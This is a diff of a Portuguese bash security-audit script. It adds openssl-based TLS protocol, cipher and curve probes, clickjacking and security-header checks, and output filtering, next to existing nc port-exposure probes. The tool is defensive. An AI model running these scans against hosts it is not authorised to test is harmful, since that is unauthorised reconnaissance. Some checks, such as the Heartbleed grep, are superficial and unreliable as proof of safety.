@@ -1,12 +1,12 @@
 #!/bin/bash
 #==============================================================================
 # HTTP Header Security Testing Suite - EXPANDED VERSION
-# Versão: 4.1.0
+# Versão: 4.2.0
 # Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
 #==============================================================================
 
 set -uo pipefail
-VERSION="4.1.0"
+VERSION="4.2.0"
 
 # Cores
 RED='\033[0;31m'
@@ -26,6 +26,7 @@ VERBOSE=false
 OUTPUT_FILE=""
 URL=""
 UA=""
+FILTER="all"  # all, pass, fail
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # User-Agents disponíveis
@@ -62,7 +63,7 @@ show_banner() {
     echo -e "${CYAN}"
     echo "╔═══════════════════════════════════════════════════════════════════════════╗"
     echo "║          HTTP Header Security Testing Suite v${VERSION} - EXPANDED        ║"
-    echo "║                     800+ Security Tests Available                         ║"
+    echo "║                     850+ Security Tests Available                         ║"
     echo "╚═══════════════════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
 }
@@ -105,7 +106,17 @@ test_curl() {
         fi
     fi
     
-    printf "  ${color}[%s]${NC} %-55s ${color}%s${NC} (HTTP %s)\n" "$status_icon" "$description" "$result_text" "$response"
+    # Aplicar filtro de exibição
+    local should_display=true
+    if [ "$FILTER" = "pass" ] && [ "$result_text" != "PASS" ]; then
+        should_display=false
+    elif [ "$FILTER" = "fail" ] && [ "$result_text" != "FAIL" ]; then
+        should_display=false
+    fi
+    
+    if [ "$should_display" = true ]; then
+        printf "  ${color}[%s]${NC} %-55s ${color}%s${NC} (HTTP %s)\n" "$status_icon" "$description" "$result_text" "$response"
+    fi
     [ -n "$OUTPUT_FILE" ] && echo "[${result_text}] ${description} - HTTP ${response}" >> "$OUTPUT_FILE"
 }
 
@@ -1964,20 +1975,31 @@ test_exposed_ports() {
         local port="$1"
         local service="$2"
         local risk="$3"
+        local result_text=""
         
         TOTAL_TESTS=$((TOTAL_TESTS + 1))
         
         # Timeout de 3 segundos para verificar a porta
         if nc -z -w 3 "$host_part" "$port" 2>/dev/null; then
             # Porta aberta - isso é RUIM para serviços internos
-            echo -e "  ${RED}[✗]${NC} Porta $port ($service) - ${RED}EXPOSTA${NC} - $risk"
+            result_text="FAIL"
             FAILED_TESTS=$((FAILED_TESTS + 1))
             [ -n "$OUTPUT_FILE" ] && echo "[FAIL] Porta $port ($service) - EXPOSTA" >> "$OUTPUT_FILE"
+            
+            # Aplicar filtro
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                echo -e "  ${RED}[✗]${NC} Porta $port ($service) - ${RED}EXPOSTA${NC} - $risk"
+            fi
         else
             # Porta fechada ou filtrada - isso é BOM
-            echo -e "  ${GREEN}[✓]${NC} Porta $port ($service) - ${GREEN}PROTEGIDA${NC}"
+            result_text="PASS"
             PASSED_TESTS=$((PASSED_TESTS + 1))
             [ -n "$OUTPUT_FILE" ] && echo "[PASS] Porta $port ($service) - Protegida" >> "$OUTPUT_FILE"
+            
+            # Aplicar filtro
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                echo -e "  ${GREEN}[✓]${NC} Porta $port ($service) - ${GREEN}PROTEGIDA${NC}"
+            fi
         fi
     }
     
@@ -2059,6 +2081,1182 @@ test_exposed_ports() {
 }
 
 #==============================================================================
+# SSL/TLS SECURITY TESTS
+#==============================================================================
+test_ssl_tls() {
+    print_section "🔒 TESTES DE SEGURANÇA SSL/TLS"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando versões de protocolo, ciphers e curvas ECDH${NC}"
+    echo ""
+    
+    # Extrair host e porta da URL
+    local host_part port protocol
+    host_part=$(echo "$URL" | sed -E 's|https?://([^/:]+).*|\1|')
+    
+    if [[ "$URL" == https://* ]]; then
+        port=$(echo "$URL" | sed -E 's|https://[^:]+:([0-9]+).*|\1|')
+        [[ "$port" == "$URL" ]] && port="443"
+        protocol="https"
+    else
+        echo -e "  ${YELLOW}⚠️  URL não é HTTPS. Testes SSL/TLS requerem conexão segura.${NC}"
+        return
+    fi
+    
+    # Verificar se openssl está disponível
+    if ! command -v openssl &> /dev/null; then
+        echo -e "  ${RED}❌ openssl não encontrado. Instale com: apt install openssl${NC}"
+        return
+    fi
+    
+    # Função auxiliar para testar protocolo SSL/TLS
+    test_protocol() {
+        local proto="$1"
+        local proto_name="$2"
+        local should_fail="$3"  # "yes" = protocolo deve ser bloqueado
+        local result_text=""
+        
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        
+        local result
+        result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -${proto} 2>&1)
+        
+        if echo "$result" | grep -q "Cipher is"; then
+            # Conexão bem sucedida
+            if [ "$should_fail" = "yes" ]; then
+                result_text="FAIL"
+                FAILED_TESTS=$((FAILED_TESTS + 1))
+                [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $proto_name - Protocolo vulnerável aceito" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                    echo -e "  ${RED}[✗]${NC} $proto_name - ${RED}VULNERÁVEL${NC} (protocolo obsoleto aceito!)"
+                fi
+            else
+                result_text="PASS"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $proto_name - Suportado" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                    echo -e "  ${GREEN}[✓]${NC} $proto_name - ${GREEN}SUPORTADO${NC}"
+                fi
+            fi
+        else
+            # Conexão falhou
+            if [ "$should_fail" = "yes" ]; then
+                result_text="PASS"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $proto_name - Corretamente bloqueado" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                    echo -e "  ${GREEN}[✓]${NC} $proto_name - ${GREEN}BLOQUEADO${NC} (correto!)"
+                fi
+            else
+                [ -n "$OUTPUT_FILE" ] && echo "[INFO] $proto_name - Não suportado" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ]; then
+                    echo -e "  ${YELLOW}[?]${NC} $proto_name - ${YELLOW}NÃO SUPORTADO${NC}"
+                fi
+            fi
+        fi
+    }
+    
+    # Função para testar cipher suite
+    test_cipher() {
+        local cipher="$1"
+        local cipher_name="$2"
+        local should_fail="$3"
+        local result_text=""
+        
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        
+        local result
+        result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -cipher "$cipher" 2>&1)
+        
+        if echo "$result" | grep -q "Cipher is"; then
+            if [ "$should_fail" = "yes" ]; then
+                local used_cipher
+                used_cipher=$(echo "$result" | grep "Cipher is" | awk '{print $NF}')
+                result_text="FAIL"
+                FAILED_TESTS=$((FAILED_TESTS + 1))
+                [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $cipher_name - Cipher fraco aceito: $used_cipher" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                    echo -e "  ${RED}[✗]${NC} $cipher_name - ${RED}VULNERÁVEL${NC} (usando: $used_cipher)"
+                fi
+            else
+                result_text="PASS"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                    echo -e "  ${GREEN}[✓]${NC} $cipher_name - ${GREEN}SUPORTADO${NC}"
+                fi
+            fi
+        else
+            if [ "$should_fail" = "yes" ]; then
+                result_text="PASS"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $cipher_name - Corretamente bloqueado" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                    echo -e "  ${GREEN}[✓]${NC} $cipher_name - ${GREEN}BLOQUEADO${NC}"
+                fi
+            else
+                if [ "$FILTER" = "all" ]; then
+                    echo -e "  ${YELLOW}[?]${NC} $cipher_name - ${YELLOW}NÃO SUPORTADO${NC}"
+                fi
+            fi
+        fi
+    }
+    
+    print_subsection "Versões de Protocolo (Vulneráveis devem ser BLOQUEADOS)"
+    
+    # SSLv2 - CRÍTICO: Totalmente inseguro
+    test_protocol "ssl2" "SSLv2 (CRÍTICO - POODLE, DROWN)" "yes" 2>/dev/null || \
+        echo -e "  ${GREEN}[✓]${NC} SSLv2 - ${GREEN}NÃO COMPILADO${NC} (openssl moderno)"
+    
+    # SSLv3 - CRÍTICO: POODLE vulnerability
+    test_protocol "ssl3" "SSLv3 (CRÍTICO - POODLE)" "yes" 2>/dev/null || \
+        echo -e "  ${GREEN}[✓]${NC} SSLv3 - ${GREEN}NÃO COMPILADO${NC} (openssl moderno)"
+    
+    # TLSv1.0 - Vulnerável: BEAST, POODLE
+    test_protocol "tls1" "TLSv1.0 (Vulnerável - BEAST)" "yes"
+    
+    # TLSv1.1 - Deprecated: Fraco
+    test_protocol "tls1_1" "TLSv1.1 (Deprecated)" "yes"
+    
+    # TLSv1.2 - OK se com ciphers fortes
+    test_protocol "tls1_2" "TLSv1.2 (Seguro com bons ciphers)" "no"
+    
+    # TLSv1.3 - Recomendado
+    test_protocol "tls1_3" "TLSv1.3 (Recomendado)" "no"
+    
+    print_subsection "Cipher Suites Vulneráveis (devem ser BLOQUEADOS)"
+    
+    # NULL ciphers - Sem criptografia
+    test_cipher "NULL" "NULL ciphers (sem criptografia)" "yes"
+    test_cipher "eNULL" "eNULL (encryption NULL)" "yes"
+    test_cipher "aNULL" "aNULL (auth NULL)" "yes"
+    
+    # EXPORT ciphers - Fracos por design (FREAK attack)
+    test_cipher "EXPORT" "EXPORT ciphers (FREAK attack)" "yes"
+    test_cipher "EXP" "EXP ciphers (export grade)" "yes"
+    
+    # DES ciphers - Chave muito curta
+    test_cipher "DES" "DES (56-bit - muito fraco)" "yes"
+    test_cipher "DES-CBC-SHA" "DES-CBC-SHA (single DES)" "yes"
+    
+    # 3DES/Triple DES - Vulnerável ao SWEET32
+    test_cipher "3DES" "3DES/Triple DES (SWEET32)" "yes"
+    test_cipher "DES-CBC3-SHA" "DES-CBC3-SHA (3DES)" "yes"
+    
+    # RC4 - Múltiplas vulnerabilidades
+    test_cipher "RC4" "RC4 (múltiplas vulnerabilidades)" "yes"
+    test_cipher "RC4-SHA" "RC4-SHA" "yes"
+    test_cipher "RC4-MD5" "RC4-MD5" "yes"
+    
+    # MD5 - Hash fraco
+    test_cipher "MD5" "MD5 MAC (hash fraco)" "yes"
+    
+    # Anonymous ciphers - Sem autenticação (MitM)
+    test_cipher "ADH" "ADH (Anonymous DH)" "yes"
+    test_cipher "AECDH" "AECDH (Anonymous ECDH)" "yes"
+    
+    # LOW strength ciphers
+    test_cipher "LOW" "LOW strength ciphers" "yes"
+    
+    # IDEA - Patente expirada, considerado fraco
+    test_cipher "IDEA" "IDEA cipher" "yes"
+    
+    # SEED - Cipher coreano, pouco auditado
+    test_cipher "SEED" "SEED cipher" "yes"
+    
+    # Camellia - Aceitável mas prefira AES
+    test_cipher "CAMELLIA128" "CAMELLIA-128" "no"
+    
+    print_subsection "Cipher Suites Seguros (devem ser SUPORTADOS)"
+    
+    # AES-GCM - Recomendado
+    test_cipher "AES128-GCM-SHA256" "AES128-GCM-SHA256" "no"
+    test_cipher "AES256-GCM-SHA384" "AES256-GCM-SHA384" "no"
+    
+    # ECDHE - Perfect Forward Secrecy
+    test_cipher "ECDHE-RSA-AES128-GCM-SHA256" "ECDHE-RSA-AES128-GCM-SHA256 (PFS)" "no"
+    test_cipher "ECDHE-RSA-AES256-GCM-SHA384" "ECDHE-RSA-AES256-GCM-SHA384 (PFS)" "no"
+    test_cipher "ECDHE-ECDSA-AES128-GCM-SHA256" "ECDHE-ECDSA-AES128-GCM-SHA256 (PFS)" "no"
+    test_cipher "ECDHE-ECDSA-AES256-GCM-SHA384" "ECDHE-ECDSA-AES256-GCM-SHA384 (PFS)" "no"
+    
+    # ChaCha20-Poly1305 - Excelente para mobile
+    test_cipher "ECDHE-RSA-CHACHA20-POLY1305" "ECDHE-RSA-CHACHA20-POLY1305" "no"
+    test_cipher "ECDHE-ECDSA-CHACHA20-POLY1305" "ECDHE-ECDSA-CHACHA20-POLY1305" "no"
+    
+    print_subsection "Curvas ECDH (Fracas devem ser BLOQUEADAS)"
+    
+    # Função para testar curvas
+    test_curve() {
+        local curve="$1"
+        local curve_name="$2"
+        local should_fail="$3"
+        local result_text=""
+        
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        
+        local result
+        result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -curves "$curve" 2>&1)
+        
+        if echo "$result" | grep -q "Cipher is"; then
+            if [ "$should_fail" = "yes" ]; then
+                result_text="FAIL"
+                FAILED_TESTS=$((FAILED_TESTS + 1))
+                [ -n "$OUTPUT_FILE" ] && echo "[FAIL] Curva $curve_name - Curva fraca aceita" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                    echo -e "  ${RED}[✗]${NC} Curva $curve_name - ${RED}VULNERÁVEL${NC} (curva fraca aceita)"
+                fi
+            else
+                result_text="PASS"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                    echo -e "  ${GREEN}[✓]${NC} Curva $curve_name - ${GREEN}SUPORTADA${NC}"
+                fi
+            fi
+        else
+            if [ "$should_fail" = "yes" ]; then
+                result_text="PASS"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                    echo -e "  ${GREEN}[✓]${NC} Curva $curve_name - ${GREEN}BLOQUEADA${NC}"
+                fi
+            else
+                if [ "$FILTER" = "all" ]; then
+                    echo -e "  ${YELLOW}[?]${NC} Curva $curve_name - ${YELLOW}NÃO SUPORTADA${NC}"
+                fi
+            fi
+        fi
+    }
+    
+    # Curvas fracas (< 224 bits)
+    test_curve "secp160k1" "secp160k1 (160-bit - FRACA)" "yes"
+    test_curve "secp160r1" "secp160r1 (160-bit - FRACA)" "yes"
+    test_curve "secp160r2" "secp160r2 (160-bit - FRACA)" "yes"
+    test_curve "secp192k1" "secp192k1 (192-bit - FRACA)" "yes"
+    test_curve "prime192v1" "prime192v1/P-192 (192-bit - FRACA)" "yes"
+    
+    # Curvas seguras
+    test_curve "prime256v1" "prime256v1/P-256 (256-bit)" "no"
+    test_curve "secp384r1" "secp384r1/P-384 (384-bit)" "no"
+    test_curve "secp521r1" "secp521r1/P-521 (521-bit)" "no"
+    test_curve "X25519" "X25519 (Curve25519 - Recomendada)" "no"
+    test_curve "X448" "X448 (Curve448)" "no"
+    
+    print_subsection "Vulnerabilidades Conhecidas"
+    
+    # CRIME - Compressão TLS
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    local compression
+    compression=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>&1 | grep "Compression:")
+    if echo "$compression" | grep -qi "NONE"; then
+        echo -e "  ${GREEN}[✓]${NC} CRIME (TLS Compression) - ${GREEN}PROTEGIDO${NC} (compressão desabilitada)"
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+    else
+        echo -e "  ${RED}[✗]${NC} CRIME (TLS Compression) - ${RED}VULNERÁVEL${NC} (compressão habilitada)"
+        FAILED_TESTS=$((FAILED_TESTS + 1))
+    fi
+    
+    # Heartbleed (verificação básica)
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    if command -v timeout &> /dev/null; then
+        local hb_result
+        hb_result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -tlsextdebug 2>&1 | grep -i "heartbeat")
+        if [ -n "$hb_result" ]; then
+            echo -e "  ${YELLOW}[?]${NC} Heartbleed - ${YELLOW}HEARTBEAT HABILITADO${NC} (verificar versão OpenSSL do servidor)"
+        else
+            echo -e "  ${GREEN}[✓]${NC} Heartbleed - ${GREEN}PROTEGIDO${NC} (heartbeat não detectado)"
+            PASSED_TESTS=$((PASSED_TESTS + 1))
+        fi
+    fi
+    
+    # Renegociação segura
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    local reneg
+    reneg=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>&1 | grep -i "renegotiation")
+    if echo "$reneg" | grep -qi "secure"; then
+        echo -e "  ${GREEN}[✓]${NC} Renegociação Segura - ${GREEN}HABILITADA${NC}"
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+    else
+        echo -e "  ${YELLOW}[?]${NC} Renegociação Segura - ${YELLOW}VERIFICAR${NC}"
+    fi
+    
+    # OCSP Stapling
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    local ocsp
+    ocsp=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -status 2>&1 | grep -i "OCSP Response Status")
+    if [ -n "$ocsp" ]; then
+        echo -e "  ${GREEN}[✓]${NC} OCSP Stapling - ${GREEN}HABILITADO${NC}"
+        PASSED_TESTS=$((PASSED_TESTS + 1))
+    else
+        echo -e "  ${YELLOW}[?]${NC} OCSP Stapling - ${YELLOW}NÃO DETECTADO${NC}"
+    fi
+    
+    print_subsection "Informações do Certificado"
+    
+    # Obter informações do certificado
+    local cert_info
+    cert_info=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>/dev/null | openssl x509 -noout -dates -subject -issuer 2>/dev/null)
+    
+    if [ -n "$cert_info" ]; then
+        echo -e "  ${CYAN}Certificado SSL/TLS:${NC}"
+        echo "$cert_info" | while read -r line; do
+            echo -e "    $line"
+        done
+        
+        # Verificar validade
+        local not_after
+        not_after=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>/dev/null | openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2)
+        if [ -n "$not_after" ]; then
+            local expiry_epoch now_epoch days_left
+            expiry_epoch=$(date -d "$not_after" +%s 2>/dev/null)
+            now_epoch=$(date +%s)
+            if [ -n "$expiry_epoch" ]; then
+                days_left=$(( (expiry_epoch - now_epoch) / 86400 ))
+                if [ $days_left -lt 0 ]; then
+                    echo -e "  ${RED}❌ CERTIFICADO EXPIRADO!${NC}"
+                elif [ $days_left -lt 30 ]; then
+                    echo -e "  ${YELLOW}⚠️  Certificado expira em $days_left dias!${NC}"
+                else
+                    echo -e "  ${GREEN}✓ Certificado válido por mais $days_left dias${NC}"
+                fi
+            fi
+        fi
+        
+        # Verificar tamanho da chave
+        local key_size
+        key_size=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" 2>/dev/null | openssl x509 -noout -text 2>/dev/null | grep "Public-Key:" | grep -oP '\d+')
+        if [ -n "$key_size" ]; then
+            TOTAL_TESTS=$((TOTAL_TESTS + 1))
+            if [ "$key_size" -lt 2048 ]; then
+                echo -e "  ${RED}[✗]${NC} Tamanho da chave: ${RED}${key_size} bits (FRACO - mínimo 2048)${NC}"
+                FAILED_TESTS=$((FAILED_TESTS + 1))
+            elif [ "$key_size" -lt 4096 ]; then
+                echo -e "  ${GREEN}[✓]${NC} Tamanho da chave: ${GREEN}${key_size} bits (adequado)${NC}"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+            else
+                echo -e "  ${GREEN}[✓]${NC} Tamanho da chave: ${GREEN}${key_size} bits (forte)${NC}"
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+            fi
+        fi
+    fi
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Recomendações de Hardening SSL/TLS:${NC}"
+    echo -e "  ${YELLOW}• Desabilitar:${NC} SSLv2, SSLv3, TLSv1.0, TLSv1.1"
+    echo -e "  ${YELLOW}• Habilitar:${NC} TLSv1.2 e TLSv1.3 apenas"
+    echo -e "  ${YELLOW}• Ciphers Nginx:${NC}"
+    echo -e "    ssl_protocols TLSv1.2 TLSv1.3;"
+    echo -e "    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
+    echo -e "                 ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
+    echo -e "                 ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';"
+    echo -e "    ssl_prefer_server_ciphers on;"
+    echo -e "    ssl_ecdh_curve X25519:prime256v1:secp384r1;"
+    echo -e "  ${YELLOW}• HSTS:${NC} add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\";"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
+# CLICKJACKING PROTECTION (X-Frame-Options / CSP frame-ancestors)
+#==============================================================================
+test_clickjacking() {
+    print_section "🖼️ TESTES DE PROTEÇÃO CONTRA CLICKJACKING"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando headers de proteção contra Clickjacking${NC}"
+    echo -e "  ${YELLOW}   X-Frame-Options e CSP frame-ancestors devem estar presentes${NC}"
+    echo ""
+    
+    print_subsection "Verificação de Headers de Proteção"
+    
+    # Obter headers da resposta
+    local headers
+    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
+    
+    # Teste X-Frame-Options
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    if echo "$headers" | grep -qi "X-Frame-Options"; then
+        local xfo_value
+        xfo_value=$(echo "$headers" | grep -i "X-Frame-Options" | head -1 | cut -d':' -f2 | tr -d ' \r')
+        if [[ "${xfo_value^^}" == "DENY" ]] || [[ "${xfo_value^^}" == "SAMEORIGIN" ]]; then
+            PASSED_TESTS=$((PASSED_TESTS + 1))
+            [ -n "$OUTPUT_FILE" ] && echo "[PASS] X-Frame-Options: $xfo_value" >> "$OUTPUT_FILE"
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                echo -e "  ${GREEN}[✓]${NC} X-Frame-Options: ${GREEN}$xfo_value${NC}"
+            fi
+        else
+            FAILED_TESTS=$((FAILED_TESTS + 1))
+            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] X-Frame-Options: Valor fraco ($xfo_value)" >> "$OUTPUT_FILE"
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                echo -e "  ${RED}[✗]${NC} X-Frame-Options: ${RED}Valor fraco ($xfo_value)${NC}"
+            fi
+        fi
+    else
+        FAILED_TESTS=$((FAILED_TESTS + 1))
+        [ -n "$OUTPUT_FILE" ] && echo "[FAIL] X-Frame-Options: AUSENTE" >> "$OUTPUT_FILE"
+        if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+            echo -e "  ${RED}[✗]${NC} X-Frame-Options: ${RED}AUSENTE${NC} - Vulnerável a Clickjacking!"
+        fi
+    fi
+    
+    # Teste CSP frame-ancestors
+    TOTAL_TESTS=$((TOTAL_TESTS + 1))
+    if echo "$headers" | grep -qi "Content-Security-Policy"; then
+        local csp_value
+        csp_value=$(echo "$headers" | grep -i "Content-Security-Policy" | head -1)
+        if echo "$csp_value" | grep -qi "frame-ancestors"; then
+            PASSED_TESTS=$((PASSED_TESTS + 1))
+            local frame_ancestors
+            frame_ancestors=$(echo "$csp_value" | grep -oP "frame-ancestors[^;]+" | head -1)
+            [ -n "$OUTPUT_FILE" ] && echo "[PASS] CSP frame-ancestors presente" >> "$OUTPUT_FILE"
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                echo -e "  ${GREEN}[✓]${NC} CSP frame-ancestors: ${GREEN}Configurado${NC}"
+            fi
+        else
+            [ -n "$OUTPUT_FILE" ] && echo "[INFO] CSP presente mas sem frame-ancestors" >> "$OUTPUT_FILE"
+            if [ "$FILTER" = "all" ]; then
+                echo -e "  ${YELLOW}[?]${NC} CSP presente mas ${YELLOW}sem frame-ancestors${NC}"
+            fi
+        fi
+    else
+        [ -n "$OUTPUT_FILE" ] && echo "[INFO] Content-Security-Policy: AUSENTE" >> "$OUTPUT_FILE"
+        if [ "$FILTER" = "all" ]; then
+            echo -e "  ${YELLOW}[?]${NC} Content-Security-Policy: ${YELLOW}AUSENTE${NC}"
+        fi
+    fi
+    
+    print_subsection "Testes de Bypass de Clickjacking"
+    
+    # Testar com diferentes headers que podem bypassar proteções
+    test_curl "Clickjacking: Request normal" "allow" -A "$UA" -Lk "$URL"
+    test_curl "Clickjacking: X-Frame-Options: ALLOW" "block" -A "$UA" -Lk -H "X-Frame-Options: ALLOW" "$URL"
+    test_curl "Clickjacking: X-Frame-Options vazio" "block" -A "$UA" -Lk -H "X-Frame-Options:" "$URL"
+    
+    echo ""
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${BOLD}💡 Recomendações Anti-Clickjacking:${NC}"
+    echo -e "  ${YELLOW}• Nginx:${NC} add_header X-Frame-Options \"DENY\" always;"
+    echo -e "  ${YELLOW}• CSP:${NC} add_header Content-Security-Policy \"frame-ancestors 'none';\" always;"
+    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+#==============================================================================
+# SECURITY HEADERS CHECK (Headers de Segurança Essenciais)
+#==============================================================================
+test_security_headers() {
+    print_section "🔒 VERIFICAÇÃO DE HEADERS DE SEGURANÇA"
+    
+    echo -e "  ${YELLOW}ℹ️  Verificando presença e configuração de headers de segurança${NC}"
+    echo ""
+    
+    # Obter headers da resposta
+    local headers
+    headers=$(curl -sI -A "$UA" -Lk "$URL" 2>/dev/null)
+    
+    print_subsection "Headers de Segurança Essenciais"
+    
+    # Array de headers a verificar: "nome|deve_conter|descrição"
+    local security_headers=(
+        "X-Content-Type-Options|nosniff|Previne MIME-type sniffing (XSSI)"
+        "X-XSS-Protection|1|Proteção XSS do navegador (legacy)"
+        "Referrer-Policy||Controla envio de Referer"
+        "Permissions-Policy||Controla APIs do navegador"
+        "Strict-Transport-Security|max-age|HSTS - Força HTTPS"
+        "X-Permitted-Cross-Domain-Policies||Controla políticas cross-domain"
+        "Cross-Origin-Opener-Policy||COOP - Isolamento de origem"
+        "Cross-Origin-Resource-Policy||CORP - Política de recursos"
+        "Cross-Origin-Embedder-Policy||COEP - Política de embedder"
+    )
+    
+    for header_info in "${security_headers[@]}"; do
+        local header_name header_value header_desc
+        header_name=$(echo "$header_info" | cut -d'|' -f1)
+        header_value=$(echo "$header_info" | cut -d'|' -f2)
+        header_desc=$(echo "$header_info" | cut -d'|' -f3)
+        
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        
+        if echo "$headers" | grep -qi "^${header_name}:"; then
+            local actual_value
+            actual_value=$(echo "$headers" | grep -i "^${header_name}:" | head -1 | cut -d':' -f2- | tr -d '\r' | xargs)
+            
+            if [ -n "$header_value" ]; then
+                if echo "$actual_value" | grep -qi "$header_value"; then
+                    PASSED_TESTS=$((PASSED_TESTS + 1))
+                    [ -n "$OUTPUT_FILE" ] && echo "[PASS] $header_name: $actual_value" >> "$OUTPUT_FILE"
+                    if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                        echo -e "  ${GREEN}[✓]${NC} $header_name: ${GREEN}$actual_value${NC}"
+                    fi
+                else
+                    FAILED_TESTS=$((FAILED_TESTS + 1))
+                    [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $header_name: Valor incorreto ($actual_value)" >> "$OUTPUT_FILE"
+                    if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                        echo -e "  ${YELLOW}[!]${NC} $header_name: ${YELLOW}$actual_value${NC} (esperado: $header_value)"
+                    fi
+                fi
+            else
+                PASSED_TESTS=$((PASSED_TESTS + 1))
+                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $header_name: Presente" >> "$OUTPUT_FILE"
+                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
+                    echo -e "  ${GREEN}[✓]${NC} $header_name: ${GREEN}$actual_value${NC}"
+                fi
+            fi
+        else
+            FAILED_TESTS=$((FAILED_TESTS + 1))
+            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $header_name: AUSENTE - $header_desc" >> "$OUTPUT_FILE"
+            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
+                echo -e "  ${RED}[✗]${NC} $header_name: ${RED}AUSENTE${NC} - $header_desc"
+            fi
+        fi
+    done
+    
+    print_subsection "Headers que Devem Estar AUSENTES"
+    
+    # Headers que não devem existir (information disclosure)
+    local bad_headers=(
+        "Server|Revela versão do servidor"
+        "X-Powered-By|Revela tecnologia backend"
+        "X-AspNet-Version|Revela versão ASP.NET"
+        "X-AspNetMvc-Version|Revela versão MVC"
+        "X-Generator|Revela CMS/framework"
+    )
+    
+    for header_info in "${bad_headers[@]}"; do
+        local header_name header_desc
+        header_name=$(echo "$header_info" | cut -d'|' -f1)
+        header_desc=$(echo "$header_info" | cut -d'|' -f2)
+        
+        TOTAL_TESTS=$((TOTAL_TESTS + 1))
+        
+        local header_found
+        header_found=$(echo "$headers" | grep -i "^${header_name}:" | head -1)
+        
+        if [ -n "$header_found" ]; then
